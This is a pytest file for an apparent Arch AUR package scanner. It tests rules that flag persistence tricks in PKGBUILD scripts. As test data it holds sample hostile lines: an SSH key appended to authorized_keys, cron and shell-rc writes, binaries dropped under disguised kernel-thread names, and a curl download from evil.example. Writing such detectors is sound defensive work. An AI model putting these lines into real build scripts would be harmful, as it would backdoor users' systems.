from __future__ import annotations

from aurmanager.rules.persistence import (
    PER001ShellRcWrite,
    PER002CronPersistence,
    PER003SystemdEnableAtBuildTime,
    PER004AutostartWrite,
    PER005AuthorizedKeysAppend,
    PER006DisguisedBinaryDrop,
)


def test_per001_fires_on_bashrc_append(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          echo "export FOO=bar" >> ~/.bashrc
        }
        """
    )
    assert len(list(PER001ShellRcWrite().check(ctx))) == 1


def test_per002_fires_on_crontab_install_from_file(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          crontab /tmp/job.cron
        }
        """
    )
    assert len(list(PER002CronPersistence().check(ctx))) == 1


def test_per002_fires_on_crontab_edit_even_with_sudo_prefix(make_pkgbuild_ctx):
    # crontab -e has no legitimate use in an unattended build/install script (it
    # opens an interactive editor) -- flag it, including when prefixed with sudo.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          sudo crontab -e
        }
        """
    )
    assert len(list(PER002CronPersistence().check(ctx))) == 1


def test_per002_does_not_fire_on_crontab_list_or_remove(make_pkgbuild_ctx):
    # crontab -l (list) and crontab -r (remove) are read-only/destructive, not
    # installing anything -- neither should be flagged as persistence.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          crontab -l
          crontab -r
        }
        """
    )
    assert list(PER002CronPersistence().check(ctx)) == []


def test_per003_fires_on_systemctl_enable(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        package() {
          systemctl enable myservice.service
        }
        """
    )
    assert len(list(PER003SystemdEnableAtBuildTime().check(ctx))) == 1


def test_per003_does_not_fire_on_shipping_unit_file(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        package() {
          install -Dm644 myservice.service "$pkgdir/usr/lib/systemd/system/myservice.service"
        }
        """
    )
    assert list(PER003SystemdEnableAtBuildTime().check(ctx)) == []


def test_per004_fires_on_autostart_copy(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cp x.desktop ~/.config/autostart/x.desktop
        }
        """
    )
    assert len(list(PER004AutostartWrite().check(ctx))) == 1


def test_per005_fires_on_authorized_keys_append(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          echo "ssh-rsa AAAA" >> ~/.ssh/authorized_keys
        }
        """
    )
    assert len(list(PER005AuthorizedKeysAppend().check(ctx))) == 1


def test_per006_fires_on_disguised_tmp_binary(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cp payload /tmp/systemd-initd
        }
        """
    )
    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1


def test_per006_does_not_fire_on_normal_tmp_use(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cp payload /tmp/build-scratch
        }
        """
    )
    assert list(PER006DisguisedBinaryDrop().check(ctx)) == []


def test_per006_fires_on_disguised_tmp_binary_with_trailing_slash(make_pkgbuild_ctx):
    # Regression: _DISGUISED_NAME_RE was anchored with a bare $, so a destination
    # path with a trailing slash (treating the target as a directory) evaded
    # detection even though the disguised name is identical.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cp payload /tmp/systemd-initd/
        }
        """
    )
    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1


def test_per006_fires_on_bracketed_kworker_name_with_colon(make_pkgbuild_ctx):
    # Real per-CPU kernel-thread names look like [kworker/0:3] -- the colon (and
    # internal slash) must not break basename matching.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          cp payload "/tmp/[kworker/0:3]"
        }
        """
    )
    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1


def test_per006_fires_on_bundled_curl_flags(make_pkgbuild_ctx):
    ctx = make_pkgbuild_ctx(
        """
        build() {
          curl -fsSLo /tmp/kworker/0:3 https://evil.example/payload
        }
        """
    )
    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1


def test_per006_does_not_fire_on_wget_log_file_flag(make_pkgbuild_ctx):
    # wget's -o is its own LOG file, not a content-download target -- unlike
    # curl, where -o *is* the content target. Redirecting wget's log chatter to
    # a /tmp/systemd-* path isn't dropping a disguised binary there.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          wget -o /tmp/systemd-fake https://example.com/legit-tool.tar.gz
        }
        """
    )
    assert list(PER006DisguisedBinaryDrop().check(ctx)) == []


def test_per006_fires_on_wget_output_document_flag(make_pkgbuild_ctx):
    # wget's -O (uppercase) IS the content-download target.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          wget -O /tmp/systemd-fake https://example.com/legit-tool.tar.gz
        }
        """
    )
    assert len(list(PER006DisguisedBinaryDrop().check(ctx))) == 1


def test_per006_does_not_fire_on_positional_arg_after_terminator(make_pkgbuild_ctx):
    # After `--`, curl treats every remaining word as positional, not an option --
    # so `-o /tmp/systemd-initd` here is a URL-like positional argument, not the
    # output flag. Must not be misread as a content-download target.
    ctx = make_pkgbuild_ctx(
        """
        build() {
          curl -- -o /tmp/systemd-initd
        }
        """
    )
    assert list(PER006DisguisedBinaryDrop().check(ctx)) == []
